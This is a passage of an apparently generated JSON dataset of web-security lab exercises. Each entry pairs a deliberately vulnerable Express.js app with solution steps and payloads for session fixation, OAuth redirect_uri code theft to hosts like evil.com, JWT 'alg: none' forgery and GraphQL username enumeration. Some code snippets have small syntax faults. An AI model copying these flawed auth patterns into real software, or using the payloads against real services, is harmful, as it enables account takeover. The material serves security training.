      "Verify the lab is solved by accessing protected content using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 's3cr3t' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.session || 'sess' + Math.random().toString(36).substr(2); sessions[sid] = username; res.cookie('session', sid); return res.send('Logged in'); } return res.status(403).send('Unauthorized'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session]; if (username === 'carlos') return res.send('Account: carlos'); return res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(Session Fixation Lab running on http://localhost:${PORT}));",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session=attacker123 then reuse it on /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth token manipulation via redirect_uri parameter injection",
    "Lab Description": "This OAuth-based authentication flow is vulnerable to a redirect_uri validation flaw. It fails to strictly validate the domain of redirection endpoints, allowing attackers to steal OAuth authorization codes. To solve: Inject a malicious redirect_uri that sends the authorization code to your server, retrieve the stolen code, and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy the login process and inspect the OAuth authorization request.",
      "Identify the redirect_uri parameter and test injection using a trusted-looking subdomain (e.g., https://evil.example.com).",
      "Host a listener on your own server (e.g., ngrok) to receive the stolen code.",
      "Craft the full OAuth URL with the manipulated redirect_uri and trick the victim (Carlos) into clicking it.",
      "Capture the authorization code from your listener and exchange it manually at the OAuth provider's /token endpoint using Postman.",
      "Use the access_token in an authenticated request to /my-account to confirm lab success."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const validClients = ['app-client-1']; const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!validClients.includes(client_id)) return res.status(403).send('Invalid client'); const code = Math.random().toString(36).substr(2); authCodes[code] = 'carlos'; const uri = `${redirect_uri}?code=${code}&state=${state}`; return res.redirect(uri); }); app.post('/token', (req, res) => { const { code } = req.body; if (!authCodes[code]) return res.status(403).send('Invalid code'); const token = 'access-token-' + Math.random().toString(36).substr(2); tokens[token] = authCodes[code]; return res.json({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos Account Accessed'); return res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(OAuth Redirection Lab running on http://localhost:${PORT}));",
    "payloads": [
      "https://oauth.example.com/authorize?client_id=app-client-1&redirect_uri=https://evil.example.com/steal&state=abc123",
      "POST /token with stolen code to get access_token",
      "Authorization: Bearer access-token-xyz123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in token verification",
    "Lab Description": "The application verifies user sessions using JSON Web Tokens (JWTs). The JWT validation logic accepts any token using either the HS256 or RS256 algorithm. However, the public key used for RS256 verification is not securely isolated. The application trusts tokens signed with HS256 and validates them using a hardcoded RS256 public key, creating an algorithm confusion vector. To solve: forge a valid token to impersonate Carlos and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your JWT after logging in.",
      "Validate algorithm type and key handling by sending the token to jwt.io and modifying its header to 'alg':'none' or 'alg':'HS256'.",
      "Craft a new JWT with the header 'alg':'HS256' and payload { 'username': 'carlos' }, then sign it with the public key as a secret.",
      "Inject the modified token into the Authorization header and send a request to /account.",
      "If successful, the page will show Carlos's data. Confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./keys/public.pem'); app.use(require('body-parser').json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}, Payload: {\"username\":\"carlos\"}, Secret: <RS256 public key as string>",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Unsigned JWT"
    ]
  },
  {
    "Lab scenario": "Session fixation in OAuth authorization redirect flow",
    "Lab Description": "The application uses OAuth for authentication via a third-party provider. However, the session ID is assigned before user authentication and not regenerated after login. This allows a malicious actor to fix a session ID by luring the victim into authenticating under a session the attacker controls. To solve: log in as Carlos using a fixed session and access their account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login OAuth redirect request using OWASP ZAP and capture the session cookie.",
      "Send the login link with the fixed session cookie attached to Carlos.",
      "When Carlos logs in via the OAuth provider, the session is updated with his credentials, but the session ID remains the same.",
      "Reuse the fixed session cookie in your browser and visit /account.",
      "Validate that Carlos's data is visible, confirming session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'oauthsecret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauth = 'init'; res.redirect('https://provider.com/oauth/authorize?client_id=abc&redirect_uri=http://localhost:3000/callback'); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (req.session.user) res.send(`Welcome ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(3000);",
    "payloads": [
      "Set session cookie before OAuth login: connect.sid=abc123; send link with attached cookie to victim",
      "After victim authenticates, reuse connect.sid=abc123 to access /account"
    ]
  },
  {
    "Lab scenario": "Blind username discovery through GraphQL error differentiation",
    "Lab Description": "The application exposes a GraphQL endpoint that handles authentication queries. Due to a misconfigured error-handling mechanism, responses differ slightly based on the validity of the username during login attempts. This side-channel allows blind enumeration of usernames. To solve: enumerate Carlos's username and use it to brute-force his password to access his profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send GraphQL mutation queries with various usernames using Postman.",
      "Use Burp Suite Intruder to automate mutation testing for username values in the loginUser mutation.",
      "Analyze differences in HTTP status codes or error messages for invalid users vs wrong passwords.",
      "After finding Carlos's username, use Burp Intruder again to brute-force the password with fixed username.",
      "Login to the application and access /user/profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const users = { carlos: 'hunter2', admin: 'adminpass' }; const schema = buildSchema(` type Query { _: Boolean } type Mutation { loginUser(username: String!, password: String!): String } `); const root = { loginUser: ({ username, password }) => { if (!users[username]) throw new Error('Username not found.'); if (users[username] !== password) throw new Error('Incorrect password'); return 'Login successful'; } }; app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: false })); app.listen(3000);",
    "payloads": [
      "{ \"query\": \"mutation { loginUser(username: \\\"carlos\\\", password: \\\"wrong\\\") }\" }",
      "{ \"query\": \"mutation { loginUser(username: \\\"admin\\\", password: \\\"adminpass\\\") }\" }"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm override in REST API Authentication",
    "Lab Description": "This lab uses JWTs for session management but improperly trusts the 'alg' field in incoming tokens. The application does not validate the token signature if the 'alg' is set to 'none'. The application generates signed JWTs using the HS256 algorithm, but accepts unsigned tokens with 'alg: none'. To solve: forge an unsigned JWT to impersonate Carlos and access their profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture a valid JWT after logging in with your own account.",
      "Send the captured token to Repeater. Decode it using JWT.io or Burp Decoder.",
      "Modify the payload to set 'username': 'carlos' and change 'alg' in the header to 'none'. Remove the signature.",
      "Copy the modified unsigned JWT and set it as the Authorization header using Postman or Burp Repeater.",
      "Send a GET request to /api/profile with the forged token. Verify that Carlos's profile is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { 'carlos': { password: 'supersecret' }, 'wiener': { password: 'password123' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); return res.json({ token }); } return res.status(403).send('Access denied'); }); app.get('/api/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { return res.send(`Welcome ${decoded.payload.username}`); } try { const verified = jwt.verify(token, 'secretkey'); res.send(`Welcome ${verified.username}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth2 redirect URI manipulation via open redirect in login provider",
    "Lab Description": "This OAuth flow integrates with an external identity provider (IdP), but the application accepts any redirection URI without proper validation. An attacker can manipulate the redirection URI during login to intercept authorization codes and hijack sessions. To solve: abuse the redirection vulnerability to authenticate as Carlos without credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp and intercept the OAuth login request initiated by the client to /oauth/start?redirect_uri=...",
      "Observe the redirect_uri parameter and change it to a malicious domain under your control, such as https://evil.com.",
      "Host a listener at https://evil.com to capture the redirected authorization code after login.",
      "Use the captured code to manually construct a token request to the IdP and exchange it for an access token.",
      "Use the obtained token in Authorization headers to call /account/profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth/start', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=${redirectUri}`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const code = req.query.code; const tokenResponse = await axios.post('https://idp.com/token', { code }); const userInfo = await axios.get('https://idp.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); res.send(`Welcome ${userInfo.data.username}`); }); app.listen(4000);",
    "payloads": [
      "https://idp.com/auth?response_type=code&client_id=app123&redirect_uri=https://evil.com",
      "Authorization: Bearer <token_exchanged_from_intercepted_code>"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in login flow",
    "Lab Description": "The login system assigns session identifiers before authentication and does not regenerate the session after successful login. An attacker can set a session ID via cookie and trick the victim into authenticating with it. The attacker then hijacks the session. To solve: fixate a session for Carlos and access their account using the same session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a request to /login while logged out and note the Set-Cookie header for session ID.",
      "Use Postman or Burp to set a fixed session ID manually via Cookie: session=attacker123.",
      "Send Carlos a phishing link or wait until Carlos logs in with the same fixed session ID.",
      "After Carlos logs in, reuse the same session cookie from your end.",
      "Request /account and confirm it now displays Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = { 'carlos': { password: '1234' }, 'admin': { password: 'root' } }; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'sess' + Math.floor(Math.random() * 1000); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { sessions[req.cookies.session] = username; return res.send('Login successful'); } res.send('Login failed'); }); app.get('/account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome to ${user}'s account`); } else { res.send('Please log in'); } }); app.listen(5000);",
    "payloads": [
      "Cookie: session=attacker123",
      "POST /login with session cookie already set to attacker123 and username=carlos&password=1234"
    ]
  },
  {
    "Lab scenario": "Session Fixation in OAuth Redirect Handler",
    "Lab Description": "The OAuth implementation in this application is vulnerable to session fixation. The redirect URI accepts a pre-set session identifier, which is not regenerated after successful login. The application fails to validate or rotate the session upon authentication. To solve: Hijack Carlos's session by injecting a known session ID during the OAuth redirect phase.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login redirect and examine the session cookie behavior.",
      "Send the intercepted redirect request to Burp Repeater and inject a fixed session ID using Set-Cookie header.",
      "Craft the OAuth callback to include the known session ID in the redirect URL.",
      "Use Postman or curl to access the application with the fixed session after Carlos logs in.",
      "Visit /my-account to verify the hijacked session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/oauth/callback', (req, res) => { const { session, user } = req.query; if (user === 'carlos') { res.cookie('session', session); res.redirect('/my-account'); } else { res.send('Invalid user'); } }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'fixed-session-abc') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/callback?session=fixed-session-abc&user=carlos",
      "Set-Cookie: session=fixed-session-abc",
      "curl -b 'session=fixed-session-abc' http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Auth Token Verification",
    "Lab Description": "This app validates JWT tokens using a vulnerable library that fails to enforce algorithm constraints. The JWT is signed with 'HS256', but the backend accepts 'none' and skips signature verification. To solve: Forge a token with 'none' algorithm, impersonate Carlos, and access his protected account area.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp during your own login session.",
      "Decode the JWT using jwt.io or Postman and observe the algorithm field.",
      "Modify the JWT header to use 'alg':'none' and change the payload's sub field to carlos.",
      "Remove the signature section completely and replay the token using Burp or curl.",
      "Verify account takeover by accessing /my-account with the forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "curl -H \"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Blind OAuth Token Leakage in Referer Header Injection",
    "Lab Description": "This OAuth flow redirects users to third-party domains after login. However, sensitive tokens are embedded in the Referer header due to improper scope isolation. The application fails to sanitize outbound redirects, leaking Carlos's OAuth token. To solve: Set up a malicious endpoint to intercept tokens and reuse the token to access Carlos’s account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Log in with your own OAuth account and monitor the Referer header using OWASP ZAP.",
      "Observe that the token is embedded in the Referer when redirected to external URLs.",
      "Set up a malicious site (e.g., webhook.site) and inject it as the redirect_uri via manipulated request.",
      "Trigger Carlos’s OAuth login with the crafted redirect_uri and capture the Referer header token.",
      "Replay the captured token using curl or Postman to access Carlos's protected resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const redirectMap = { 'carlos': 'http://malicious-site.com/steal?token=' }; app.get('/oauth/redirect', (req, res) => { const { user, token } = req.query; const target = redirectMap[user]; if (target) { res.redirect(`${target}${token}`); } else { res.send('User not found'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'secret-token-carlos') { res.send('Welcome carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
    "payloads": [
      "GET /oauth/redirect?user=carlos&token=secret-token-carlos",
      "Authorization: Bearer secret-token-carlos",
      "curl -H \"Authorization: Bearer secret-token-carlos\" http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login process",
    "Lab Description": "This lab is vulnerable to session fixation due to improperly handled session tokens. The application issues a session cookie before authentication and continues using it after successful login. To solve the lab, fixate a session for Carlos and access his account after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept initial GET /login request using Burp Suite and capture the issued session cookie.",
      "Send the cookie to the victim via a crafted link (e.g., phishing) or assume it was pre-set by attacker.",
      "Log in using Carlos's credentials while maintaining the fixed session (simulate Carlos using the attacker's session).",
      "Once login is successful, reuse the same session cookie on your browser.",
      "Visit /my-account using the fixed session and confirm account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixme', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send(`Account page for ${req.session.username}`); else res.send('Please login'); }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=attackerSession123",
      "Session reuse after Carlos login",
      "Phishing link: http://victimsite.com/login with preset session"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in session token validation",
    "Lab Description": "This lab is vulnerable to JWT signature tampering via `alg: none`. The application fails to properly validate JWT tokens' signature algorithm. To solve the lab, forge a JWT with `alg: none` and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT from your own session using Burp or Postman.",
      "Decode the JWT using jwt.io or a script and observe the header and payload.",
      "Modify the payload to change the username to carlos.",
      "Set the JWT header to `{ \"alg\": \"none\", \"typ\": \"JWT\" }` and remove the signature.",
      "Send the forged JWT in the Authorization: Bearer header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secret123') { const token = jwt.sign({ username }, secret); res.json({ token }); } else res.status(403).send('Forbidden'); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); return res.send(`Welcome ${payload.username}`); } try { const verified = jwt.verify(token, secret); res.send(`Welcome ${verified.username}`); } catch { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration vulnerability in redirect URI validation",
    "Lab Description": "The lab's OAuth implementation accepts arbitrary redirect URIs due to a flawed validation logic. The application uses OAuth for login but does not strictly validate registered redirect URIs. To solve the lab, obtain an access token for Carlos by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the login flow and intercept the request to /authorize using OWASP ZAP.",
      "Modify the `redirect_uri` parameter to your own malicious domain.",
      "Send the victim a link with this manipulated `redirect_uri` to steal the code.",
      "Capture the `code` parameter via your hosted server.",
      "Exchange the stolen code for an access token using /oauth/token endpoint and impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const validUsers = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const redirect = redirect_uri;  res.send(`<form method=\"POST\" action=\"/login?redirect=${redirect}\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const redirect = req.query.redirect; if (username === 'carlos' && password === 'oauthpass') { res.redirect(`${redirect}?code=authcode123`); } else { res.send('Login failed'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'token-for-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer token-for-carlos') res.send('Carlos account access granted'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://victim.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback",
      "Stolen code: authcode123",
      "POST /oauth/token with { code: authcode123 }",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session token verification",
    "Lab Description": "The application's authentication relies on JSON Web Tokens (JWT) for session validation. However, it insecurely trusts the algorithm header provided by the client, allowing an attacker to switch from 'RS256' to 'none' or 'HS256' and forge a valid token without the server's private key. The application signs session tokens with RSA but doesn't enforce algorithm validation. To solve: forge a JWT for the 'carlos' user and access the protected admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid JWT after authenticating with your own credentials.",
      "2. Decode the token using jwt.io or Postman, and observe the algorithm field set to 'RS256'.",
      "3. Modify the algorithm to 'none' and remove the signature, or switch it to 'HS256' and sign with the public key as the HMAC key.",
      "4. Send the crafted token in the Authorization header using Postman and attempt to access /admin-dashboard.",
      "5. Verify successful admin access by observing the response for admin-only data or 'Welcome carlos' message."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); jwt.verify(token, publicKey, (err, decoded) => { if (err) return res.sendStatus(403); if (decoded.username === 'carlos') res.send('Welcome carlos'); else res.sendStatus(403); }); }); app.listen(5000, () => console.log('JWT Algorithm Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.[HMAC-SHA256-SIGNATURE-using-publicKey]"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in third-party login endpoint",
    "Lab Description": "This lab's OAuth 2.0 login flow improperly accepts any token issued by an untrusted Authorization Server without validation. The application does not validate the issuer (`iss`) claim, allowing attackers to craft an access token with 'carlos' as the subject. To solve: craft a forged OAuth token using a dummy authorization server and log in as Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the OAuth login process and inspect the 'access_token' parameter returned from the Authorization Server.",
      "2. Set up a fake OAuth server (such as with oauth-toolkit or mitmproxy) and create a signed JWT with the payload { 'sub': 'carlos' }.",
      "3. Intercept the redirect request using Burp and replace the legitimate access_token with your forged one.",
      "4. Replay the modified request to the target /auth/callback endpoint.",
      "5. Verify successful login as 'carlos' by accessing the /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; const payload = jwt.decode(token); if (payload && payload.sub) { res.send(`Logged in as ${payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.get('/my-account', (req, res) => { res.send('Welcome to your account page!'); }); app.listen(3000, () => console.log('OAuth Implicit Flow Lab running'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MifQ.[Valid-Signature-With-Your-Key]",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in login endpoint",
    "Lab Description": "The web application creates a session identifier before authentication, and does not issue a new one upon successful login. This allows attackers to predefine a session ID, share it with the victim, and later hijack the session. To solve: Fixate a session, lure the victim into using it, then log in with the same session to access their My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to capture the session cookie issued before login.",
      "2. Manually set the session cookie to a known fixed value (e.g., SESSIONID=attacker-session).",
      "3. Send the link with the fixed session ID to the victim and ensure they log in without altering the session cookie.",
      "4. Reuse the same SESSIONID value to send an authenticated GET request to /my-account after the victim logs in.",
      "5. Confirm access to the victim's account page by verifying the returned user-specific content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'supersecurepassword' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies['SESSIONID']; if (session === 'attacker-session') { res.send('Welcome carlos!'); } else { res.send('Not authorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "SESSIONID=attacker-session",
      "SESSIONID=known-fixed-session-id"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in session validation",
    "Lab Description": "This lab's authentication relies on JWTs for session validation. The server fails to enforce the algorithm specified in the token header and blindly trusts the signature when 'alg' is set to 'none'. The application fails to verify JWT signatures when the token's header declares 'none' as the algorithm, allowing an attacker to forge tokens. To solve: Forge a valid JWT for the user carlos and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and capture the JWT token issued for your own account.",
      "Inspect the token using jwt.io and confirm the header uses HS256 and the payload contains your username.",
      "Modify the token's header to use 'alg':'none' and the payload to set the username to 'carlos'. Remove the signature entirely.",
      "Send the forged JWT as a cookie in the Authorization header to /my-account and verify access to Carlos's account.",
      "Access the protected page and confirm the account data belongs to carlos, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const secret = 'supersecretkey'; app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, secret)) { res.send(`Account details for ${decoded.payload.user}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"carlos\"}",
      "Token: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "This lab's session management is vulnerable to fixation. The server issues predictable session IDs that are not regenerated upon successful login. An attacker can set a victim's session identifier before they log in and then reuse it to hijack the session. To solve: Fixate a session for the user carlos, wait for them to authenticate, then reuse the session ID to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the initial unauthenticated GET request to /login and observe the Set-Cookie header containing a session ID.",
      "Send a crafted session ID (e.g., sessionid=attackercrafted123) in the Cookie header when visiting /login and verify the server accepts it.",
      "Entice the victim to log in while using the fixed sessionid=attackercrafted123 via a phishing link or CSRF.",
      "Once logged in, reuse the same sessionid=attackercrafted123 cookie to access /my-account directly.",
      "Confirm successful session takeover by accessing the user data for carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || `sess-${Math.random().toString(36).substr(2, 8)}`; res.cookie('sessionid', sessionId).send('Please log in'); }); app.post('/authenticate', (req, res) => { const { username, password } = req.query; if (users[username] === password) res.send(`Logged in as ${username}`); else res.status(401).send('Invalid login'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionid; if (sessionId === 'attackercrafted123') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Cookie: sessionid=attackercrafted123",
      "Session Fixation Attack: Use same sessionid pre and post-login"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "This lab's authentication relies on OAuth with implicit flow, but the client application fails to validate the 'state' parameter, making it vulnerable to CSRF-based token theft. The attacker can craft an authorization URL to leak the victim's token. To solve: Capture Carlos's OAuth token and use it to access his account page.",
